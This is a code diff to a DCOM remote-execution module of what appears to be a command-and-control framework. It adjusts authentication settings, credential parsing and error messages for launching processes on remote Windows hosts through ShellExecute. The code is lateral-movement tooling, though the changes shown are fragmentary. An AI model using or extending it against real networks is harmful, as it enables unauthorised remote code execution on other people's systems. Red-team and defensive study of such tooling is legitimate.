@@ -249,7 +249,7 @@ int DcomExec::process(C2Message& c2Message, C2Message& c2RetMessage)
     
     Parameters params = unpackParameters(c2Message.cmd());
     std::string result;
-    bool error = 0;
+    int error = 0;
 
 #ifdef _WIN32
     error = executeRemote(params, result);
@@ -287,9 +287,69 @@ int DcomExec::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMs
 {
 #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) || defined(C2CORE_BUILD_TESTS)
     int errorCode = c2RetMessage.errorCode();
-    if(errorCode>0)
+    
+    if(errorCode > 0)
     {
-        errorMsg = c2RetMessage.returnvalue();
+        // Handle specific error codes and provide detailed messages
+        switch (errorCode)
+        {
+            case ERROR_COINIT_FAILED:
+                errorMsg = "CoInitializeEx failed: " + c2RetMessage.returnvalue();
+                break;
+
+            case ERROR_CLSIDFROMSTRING_FAILED:
+                errorMsg = "CLSIDFromString failed: " + c2RetMessage.returnvalue();
+                break;
+
+            case ERROR_COCREATEINSTANCE_FAILED:
+                errorMsg = "CoCreateInstanceEx failed: " + c2RetMessage.returnvalue();
+                break;
+
+            case ERROR_GETIDS_ITEM_FAILED:
+                errorMsg = "Failed to get 'Item' ID: " + c2RetMessage.returnvalue();
+                break;
+
+            case ERROR_INVOKE_ITEM_FAILED:
+                errorMsg = "Invoke 'Item' method failed: " + c2RetMessage.returnvalue();
+                break;
+
+            case ERROR_GETIDS_DOCUMENT_FAILED:
+                errorMsg = "Failed to get 'Document' ID: " + c2RetMessage.returnvalue();
+                break;
+
+            case ERROR_INVOKE_DOCUMENT_FAILED:
+                errorMsg = "Invoke 'Document' method failed: " + c2RetMessage.returnvalue();
+                break;
+
+            case ERROR_GETIDS_APPLICATION_FAILED:
+                errorMsg = "Failed to get 'Application' ID: " + c2RetMessage.returnvalue();
+                break;
+
+            case ERROR_INVOKE_APPLICATION_FAILED:
+                errorMsg = "Invoke 'Application' method failed: " + c2RetMessage.returnvalue();
+                break;
+
+            case ERROR_GETIDS_SHELLEXECUTE_FAILED:
+                errorMsg = "Failed to get 'ShellExecute' ID: " + c2RetMessage.returnvalue();
+                break;
+
+            case ERROR_INVOKE_SHELLEXECUTE_FAILED:
+                errorMsg = "Invoke 'ShellExecute' method failed: " + c2RetMessage.returnvalue();
+                break;
+
+            case ERROR_AUTHIDENTITY_ALLOC_FAILED:
+                errorMsg = "Authentication identity allocation failed: " + c2RetMessage.returnvalue();
+                break;
+
+            case ERROR_SET_PROXY_BLANKET_FAILED:
+                errorMsg = "CoSetProxyBlanket failed: " + c2RetMessage.returnvalue();
+                break;
+
+            default:
+                // For any other error codes
+                errorMsg = "Unknown error occurred: " + c2RetMessage.returnvalue();
+                break;
+        }
     }
 #endif
     return 0;
@@ -402,7 +462,7 @@ namespace
 // TODO https://github.com/xforcered/ForsHops/blob/main/ForsHops.cpp ?
 int DcomExec::executeRemote(const Parameters& params, std::string& result) const
 {
-    DWORD authnSvc = RPC_C_AUTHN_NONE;
+    DWORD authnSvc = RPC_C_AUTHN_WINNT;
     const DWORD authzSvc = RPC_C_AUTHZ_NONE;
     const DWORD authnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
     const DWORD impLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
@@ -423,24 +483,20 @@ int DcomExec::executeRemote(const Parameters& params, std::string& result) const
     COAUTHINFO authInfo = {};
     bool authInfoConfigured = false;
 
+    // use user name password
+    // - local account
+    // - domain accounts
     if (useExplicitCreds)
     {
         userW = std::wstring(params.username.begin(), params.username.end());
         passW = std::wstring(params.password.begin(), params.password.end());
 
-        // Support both DOMAIN\\User and user@domain.local notations
+        // Support DOMAIN\\User 
         size_t slashPos = userW.find(L'\\');
-        size_t atPos = userW.find(L'@');
         if (slashPos != std::wstring::npos)
         {
             domainW = userW.substr(0, slashPos);
             userW = userW.substr(slashPos + 1);
-        }
-        else if (atPos != std::wstring::npos)
-        {
-            std::wstring domainPart = userW.substr(atPos + 1);
-            userW = userW.substr(0, atPos);
-            domainW = domainPart;
         }
         else
         {
@@ -466,13 +522,12 @@ int DcomExec::executeRemote(const Parameters& params, std::string& result) const
                 domainW = hostnameWide;
             }
             authnSvc = RPC_C_AUTHN_WINNT;
-            capabilities = EOAC_SECURE_REFS;
         }
         else
         {
             // Domain credentials – prefer Kerberos when an SPN is supplied, fallback to Negotiate otherwise
             authnSvc = spn.empty() ? RPC_C_AUTHN_GSS_NEGOTIATE : RPC_C_AUTHN_GSS_KERBEROS;
-            capabilities = spn.empty() ? EOAC_SECURE_REFS : (EOAC_MUTUAL_AUTH | EOAC_SECURE_REFS);
+            capabilities = spn.empty() ? EOAC_NONE : RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;
         }
 
         authIdentity = MakeAuthIdentityW(userW, domainW, passW);
@@ -482,22 +537,25 @@ int DcomExec::executeRemote(const Parameters& params, std::string& result) const
             return ERROR_AUTHIDENTITY_ALLOC_FAILED;
         }
 
-        authInfo.dwAuthnSvc = authnSvc;
+        authInfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
         authInfo.dwAuthzSvc = authzSvc;
-        authInfo.pwszServerPrincName = spn.empty() ? nullptr : const_cast<LPWSTR>(spn.c_str());
-        authInfo.dwAuthnLevel = authnLevel;
-        authInfo.dwImpersonationLevel = impLevel;
+        authInfo.pwszServerPrincName = NULL;
+        authInfo.dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
+        authInfo.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
         authInfo.pAuthIdentityData = authIdentity;
         authInfo.dwCapabilities = capabilities;
         authInfoConfigured = true;
     }
+    // Don't use credentials
+    // - kerberos ticket from process memory = !spn.empty()
+    // - local call ?
     else
     {
         // No explicit credentials provided – rely on the caller's token
         if (!spn.empty())
         {
             authnSvc = RPC_C_AUTHN_GSS_KERBEROS;
-            capabilities = EOAC_MUTUAL_AUTH | EOAC_SECURE_REFS;
+            capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;
             authInfo.dwAuthnSvc = authnSvc;
             authInfo.dwAuthzSvc = authzSvc;
             authInfo.pwszServerPrincName = const_cast<LPWSTR>(spn.c_str());
@@ -509,8 +567,8 @@ int DcomExec::executeRemote(const Parameters& params, std::string& result) const
         }
         else
         {
-            authnSvc = RPC_C_AUTHN_GSS_NEGOTIATE;
-            capabilities = EOAC_SECURE_REFS;
+            authnSvc = RPC_C_AUTHN_WINNT;
+            capabilities = EOAC_NONE;
         }
     }
 
@@ -540,8 +598,8 @@ int DcomExec::executeRemote(const Parameters& params, std::string& result) const
         RPC_C_AUTHN_LEVEL_PKT_PRIVACY,  // RPC_C_AUTHN_LEVEL
         RPC_C_IMP_LEVEL_IMPERSONATE,    // RPC_C_IMP_LEVEL
         nullptr,                        // pAuthList (use default)
-        EOAC_NONE,                      // dwCapabilities           , shoult it be EOAC_MUTUAL_AUTH | EOAC_SECURE_REFS for kerberos ??
-        nullptr                         // pReserved3
+        EOAC_NONE,                      // dwCapabilities           
+        nullptr                         // pReserved
     );
 
     // Convert CLSID
@@ -635,7 +693,6 @@ int DcomExec::executeRemote(const Parameters& params, std::string& result) const
                           DISPATCH_METHOD | DISPATCH_PROPERTYGET,
                           &dpItem, &vWindow, nullptr, nullptr);
     VariantClear(&idx);
-
     if (FAILED(hr))
     {
         result = formatHResult(hr);
@@ -644,6 +701,11 @@ int DcomExec::executeRemote(const Parameters& params, std::string& result) const
     }
 
     IDispatch* windowDisp = vWindow.pdispVal;
+    if(windowDisp==nullptr)
+    {
+        if (needUninit) CoUninitialize();
+        return ERROR_INVOKE_ITEM_FAILED;
+    }
 
     // Get "Document"
     DISPID dispidDocument;
